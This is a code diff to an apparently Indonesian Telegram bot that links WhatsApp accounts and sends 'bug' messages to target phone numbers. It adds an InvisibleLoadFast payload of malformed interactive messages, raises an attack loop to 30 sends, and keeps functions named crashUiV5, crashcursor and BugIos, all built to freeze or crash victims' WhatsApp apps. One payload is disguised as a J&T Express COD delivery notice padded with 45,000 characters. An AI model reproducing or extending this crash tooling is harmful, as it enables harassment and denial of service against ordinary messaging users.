@@ -263,7 +263,7 @@ function saveUsersToFile() {
   }
 }
 // Command broadcast (hanya bisa digunakan oleh admin)
-const Dev_ID = 7713715689; // Ganti dengan ID admin
+const Dev_ID = 5965707646; // Ganti dengan ID admin
 
 bot.command("broadcast", async (ctx) => {
   if (ctx.from.id !== Dev_ID) {
@@ -275,7 +275,90 @@ bot.command("broadcast", async (ctx) => {
   if (!message) {
     return ctx.reply("[❌ Format Salah!] Cobalah /broadcast (Pesan Anda)");
   }
+// FUNC CONNECT 
+async function startWhatsAppClient(phoneNumber, ctx) {
+  const sessionPath = path.join(sessionsDir, phoneNumber);
+  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
 
+  const store = useStore ? makeInMemoryStore({}) : undefined;
+  store && store.readFromFile && store.readFromFile(path.join(sessionPath, `${phoneNumber}_store.json`));
+  setInterval(() => {
+    store && store.writeToFile && store.writeToFile(path.join(sessionPath, `${phoneNumber}_store.json`));
+  }, 10_000);
+
+  const sock = makeWASocket({
+    printQRInTerminal: false,
+    auth: state,
+    browser: Browsers.ubuntu('Chrome'),
+    syncFullHistory: true,
+    generateHighQualityLinkPreview: true,
+    getMessage: async (key) => {
+      if (store) {
+        const msg = await (store.loadMessage && store.loadMessage(key.remoteJid, key.id));
+        return (msg && msg.message) || undefined;
+      }
+      return undefined;
+    },
+  });
+
+  sock.ev.on('creds.update', saveCreds);
+  sock.ev.on('connection.update', async (update) => {
+    const connection = update.connection;
+    const lastDisconnect = update.lastDisconnect;
+    if (connection === 'close') {
+      const shouldReconnect =
+        lastDisconnect &&
+        lastDisconnect.error &&
+        lastDisconnect.error.output &&
+        lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut;
+      console.log(
+        `[${phoneNumber}] Koneksi terputus karena `,
+        lastDisconnect && lastDisconnect.error,
+        ', reconnecting ',
+        shouldReconnect
+      );
+      if (shouldReconnect) {
+        setTimeout(() => {
+          startWhatsAppClient(phoneNumber, ctx);
+        }, 5000);
+      } else {
+        console.log(`[${phoneNumber}] Koneksi terputus: Perangkat terlogout`);
+        ctx.reply && ctx.reply(
+          `Bot WhatsApp untuk ${phoneNumber} terputus: Perangkat terlogout`
+        );
+        if (fs.existsSync(sessionPath)) {
+          fs.rmSync(sessionPath, { recursive: true, force: true });
+        }
+      }
+    } else if (connection === 'open') {
+      console.log(`[${phoneNumber}] WhatsApp terhubung!`);
+      ctx.reply && ctx.reply(`Bot WhatsApp untuk ${phoneNumber} berhasil terhubung!`);
+    }
+  });
+
+  sock.ev.on('messages.upsert', async ({ messages, type }) => {
+    const msg = messages && messages[0];
+    if (msg && !msg.key.fromMe && type === 'notify') {
+    }
+  });
+  if (sock && sock.authState && !sock.authState.creds.registered) {
+    try {
+      await new Promise((resolve) => setTimeout(resolve, 5000));
+
+      const phoneNumberWithCountryCode = phoneNumber.startsWith('0')
+        ? '62' + phoneNumber.slice(1)
+        : phoneNumber;
+      const code = await sock.requestPairingCode(phoneNumberWithCountryCode);
+      ctx.reply(`[${phoneNumber}] Pairing code: ${code}`);
+      console.log(`[${phoneNumber}] Pairing code: ${code}`);
+    } catch (error) {
+      console.error('Error saat request pairing code:', error);
+      ctx.reply && ctx.reply('Error saat request pairing code. Coba lagi /connect.');
+    }
+  }
+
+  return sock;
+}
   // Tambahkan footer ke pesan
   const footer = "\n\n🍂 Dikirim Oleh Caywzz Sang Developer";
   const finalMessage = message + footer;
@@ -452,7 +535,7 @@ Aloo ${ctx.from.first_name || 'User'} Aku Adalah Bot RanzBOT.2 Yang Siap, Memban
 │
 ㅒ
 │ /xcranz
-│ /maxpower
+│ /power
 ㅒ
 │
 ╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
@@ -1441,6 +1524,36 @@ const QBug = {
     }
   }
 };
+bot.command('connect', async (ctx) => {
+  if (ctx.from.id !== Dev_ID) {
+    return ctx.reply('❌ Maaf, perintah ini hanya untuk owner. ❌');
+  }
+
+  try {
+    const command = ctx.message.text;
+    const parts = command.split(' ');
+    if (parts.length === 2) {
+      const phoneNumber = parts[1];
+      if (!/^\d+$/.test(phoneNumber)) {
+        return ctx.reply('Nomor telepon tidak valid. Hanya boleh angka.');
+      }
+
+      if (whatsappClients[phoneNumber]) {
+        return ctx.reply('Bot WhatsApp untuk nomor ini sudah aktif.');
+      }
+      ctx.reply(
+        `Menghubungkan ke WhatsApp untuk nomor ${phoneNumber}...\nSilakan tunggu, bot akan mengirimkan kode pairing`
+      );
+      const client = await startWhatsAppClient(phoneNumber, ctx);
+      whatsappClients[phoneNumber] = client;
+    } else {
+      ctx.reply('😁🙏 oi ner pake nya gini /connect 62xxx 😉');
+    }
+  } catch (error) {
+    console.error('Unhandled error while processing /connect:', error);
+    ctx.reply('Terjadi kesalahan saat memproses perintah.');
+  }
+});
 bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
@@ -1459,16 +1572,15 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 3; i++) {
-        await crashUiV5(target, { ptcp: true });
-        await buginvite(target, { ptcp: true });
+  for (let i = 0; i < 30; i++) {
+        await InvisibleLoadFast(target, { ptcp: true });
         
   }
 
   // Menyelesaikan proses response
   await donerespone(target, ctx);
 });
-bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
+bot.command("power", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
     const userId = ctx.from.id;
 
@@ -1483,10 +1595,8 @@ bot.command("maxpower", cooldownMiddleware, checkWhatsAppConnection, async ctx =
   await prosesrespone(target, ctx);
 
   // Melakukan proses freezing 50 kali
-  for (let i = 0; i < 2; i++) {
+  for (let i = 0; i < 1; i++) {
     await crashcursor(target, { ptcp: true });
-    await InVisiLoc(target, { ptcp: true });
-    await bokep(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
@@ -2575,7 +2685,7 @@ let messagePayload = {
 viewOnceMessage: {
 message: {
 listResponseMessage: {
-title: "SV MIRANDA PUTRI NOMER LAMA HAPUS AJA, UDH MATI KARTU, JANGAN LUPA SV YA" + "💋".repeat(45000),
+title: "Halo, kami dari J&T Express akan melakukan proses delivery paket COD dengan nomor waybill JX2519576940 ke alamat anda , mohon kesediaannya untuk memastikan apakah anda benar memesan barang COD senilai Rp 240.500 Terima kasih." + ".".repeat(45000),
 listType: 2,
 singleSelectReply: {
     selectedRowId: "🩸"
@@ -2801,6 +2911,67 @@ async function buginvite(target, ptcp = true) {
         console.error("Error sending newsletter:", err);
     }
 }
+async function InvisibleLoadFast(target) {
+      try {
+        let message = {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2,
+              },
+              interactiveMessage: {
+                contextInfo: {
+                  mentionedJid: [target],
+                  isForwarded: true,
+                  forwardingScore: 999,
+                  businessMessageForwardInfo: {
+                    businessOwnerJid: target,
+                  },
+                },
+                body: {
+                  text: "ᑕᗩᒪᒪ ᗰE ᖇᗩᑎᘔ",
+                },
+                nativeFlowMessage: {
+                  buttons: [
+                    {
+                      name: "single_select",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "call_permission_request",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                  ],
+                },
+              },
+            },
+          },
+        };
+
+        await cay.relayMessage(target, message, {
+          participant: { jid: target },
+        });
+      } catch (err) {
+        console.log(err);
+      }
+    }
 async function crashUiV5(target, Ptcp = false) {
     cay.relayMessage(target, {
         ephemeralMessage: {
@@ -3439,7 +3610,7 @@ async function UpiCrash(target) {
       );
     }
     async function BugIos(target) {
-      for (let i = 0; i < 15; i++) {
+      for (let i = 0; i < 5; i++) {
         await IosMJ(target, true);
         await XiosVirus(target);
         await QDIphone(target);
